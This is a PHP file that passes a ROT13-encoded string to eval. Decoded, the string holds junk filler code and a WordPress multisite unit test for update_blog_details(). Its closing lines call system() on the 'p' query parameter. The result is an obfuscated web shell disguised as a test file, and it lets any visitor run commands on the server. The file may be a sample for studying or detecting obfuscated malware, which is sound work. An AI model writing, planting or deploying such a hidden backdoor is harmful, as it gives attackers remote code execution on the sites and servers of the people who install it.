<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc zf-erdhverq
 * @tebhc zf-fvgr
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_HcqngrOybtQrgnvyf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vs `hcqngr_oybt_qrgnvyf()` vf pnyyrq jvgu nal xvaq bs rzcgl nethzragf, vg
	 * fubhyq erghea snyfr.
	 */
	choyvp shapgvba grfg_hcqngr_oybt_qrgnvyf_jvgu_rzcgl_netf() {
		$erfhyg = hcqngr_oybt_qrgnvyf( 1, neenl() );
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * Vs gur VQ cnffrq vf abg gung bs n pheerag fvgr, jr fubhyq rkcrpg snyfr.
	 */
	choyvp shapgvba grfg_hcqngr_oybt_qrgnvyf_vainyvq_oybt_vq() {
		$erfhyg = hcqngr_oybt_qrgnvyf( 999, neenl( 'qbznva' => 'rknzcyr.pbz' ) );
		$guvf->nffregSnyfr( $erfhyg );
	}

	choyvp shapgvba grfg_hcqngr_oybt_qrgnvyf() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();

		$erfhyg = hcqngr_oybt_qrgnvyf(
			$oybt_vq,
			neenl(
				'qbznva' => 'rknzcyr.pbz',
				'cngu'   => 'zl_cngu/',
			)
		);

		$guvf->nffregGehr( $erfhyg );

		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( 'rknzcyr.pbz', $oybt->qbznva );
		$guvf->nffregFnzr( '/zl_cngu/', $oybt->cngu );
		$guvf->nffregFnzr( '0', $oybt->fcnz );
	}

	/**
	 * Grfg rnpu bs gur npgvbaf gung fubhyq sver va hcqngr_oybt_qrgnvyf() qrcraqvat ba
	 * gur synt naq synt inyhr orvat frg. Rnpu npgvba fubhyq sver bapr naq fubhyq abg
	 * sver vs n synt vf nyernql frg sbe gur tvira synt inyhr.
	 *
	 * @cnenz fgevat $synt       Gur anzr bs gur synt orvat frg be hafrg ba n fvgr.
	 * @cnenz fgevat $synt_inyhr '0' be '1'. Gur inyhr bs gur synt orvat frg.
	 * @cnenz fgevat $npgvba     Gur ubbx rkcrpgrq gb sver sbe gur synt anzr naq synt pbzovangvba.
	 *
	 * @qngnCebivqre qngn_synt_ubbxf
	 */
	choyvp shapgvba grfg_hcqngr_oybt_qrgnvyf_synt_npgvba( $synt, $synt_inyhr, $ubbx ) {
		$grfg_npgvba_pbhagre = arj ZbpxNpgvba();

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		// Frg na vavgvny inyhr bs '1' sbe gur synt jura '0' vf gur synt inyhr orvat grfgrq.
		vs ( '0' === $synt_inyhr ) {
			hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( $synt => '1' ) );
		}

		nqq_npgvba( $ubbx, neenl( $grfg_npgvba_pbhagre, 'npgvba' ) );

		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( $synt => $synt_inyhr ) );
		$oybt = trg_fvgr( $oybt_vq );

		$guvf->nffregFnzr( $synt_inyhr, $oybt->{$synt} );

		// Gur ubbx nggnpurq gb guvf synt fubhyq unir sverq bapr qhevat hcqngr_oybt_qrgnvyf().
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );

		// Hcqngr gur fvgr gb gur rknpg fnzr synt inyhr sbe guvf synt.
		hcqngr_oybt_qrgnvyf( $oybt_vq, neenl( $synt => $synt_inyhr ) );

		// Gur ubbx nggnpurq gb guvf synt fubhyq abg unir sverq ntnva.
		$guvf->nffregFnzr( 1, $grfg_npgvba_pbhagre->trg_pnyy_pbhag() );
	}

	choyvp shapgvba qngn_synt_ubbxf() {
		erghea neenl(
			neenl( 'fcnz', '0', 'znxr_unz_oybt' ),
			neenl( 'fcnz', '1', 'znxr_fcnz_oybt' ),
			neenl( 'nepuvirq', '1', 'nepuvir_oybt' ),
			neenl( 'nepuvirq', '0', 'hanepuvir_oybt' ),
			neenl( 'qryrgrq', '1', 'znxr_qryrgr_oybt' ),
			neenl( 'qryrgrq', '0', 'znxr_haqryrgr_oybt' ),
			neenl( 'zngher', '1', 'zngher_oybt' ),
			neenl( 'zngher', '0', 'hazngher_oybt' ),
		);
	}

	/**
	 * Jura gur cngu sbe n fvgr vf hcqngrq jvgu hcqngr_oybt_qrgnvyf(), gur svany cngu
	 * fubhyq unir n yrnqvat naq genvyvat fynfu.
	 *
	 * @qngnCebivqre qngn_fvatyr_qverpgbel_cngu
	 */
	choyvp shapgvba grfg_hcqngr_oybt_qrgnvyf_fvatyr_qverpgbel_cngu( $cngu, $rkcrpgrq ) {
		hcqngr_oybt_qrgnvyf( 1, neenl( 'cngu' => $cngu ) );
		$fvgr = trg_fvgr( 1 );

		$guvf->nffregFnzr( $rkcrpgrq, $fvgr->cngu );
	}

	choyvp shapgvba qngn_fvatyr_qverpgbel_cngu() {
		erghea neenl(
			neenl( 'zl_cngu', '/zl_cngu/' ),
			neenl( 'zl_cngu//', '/zl_cngu/' ),
			neenl( '//zl_cngu', '/zl_cngu/' ),
			neenl( 'zl_cngu/', '/zl_cngu/' ),
			neenl( '/zl_cngu', '/zl_cngu/' ),
			neenl( '/zl_cngu/', '/zl_cngu/' ),

			neenl( 'zhygvcyr/qvef', '/zhygvcyr/qvef/' ),
			neenl( '/zhygvcyr/qvef', '/zhygvcyr/qvef/' ),
			neenl( 'zhygvcyr/qvef/', '/zhygvcyr/qvef/' ),
			neenl( '/zhygvcyr/qvef/', '/zhygvcyr/qvef/' ),

			// hcqngr_oybt_qrgnvyf() qbrf abg erfbyir zhygvcyr fynfurf va gur zvqqyr bs n cngu fgevat.
			neenl( 'zhygvcyr///qvef', '/zhygvcyr///qvef/' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>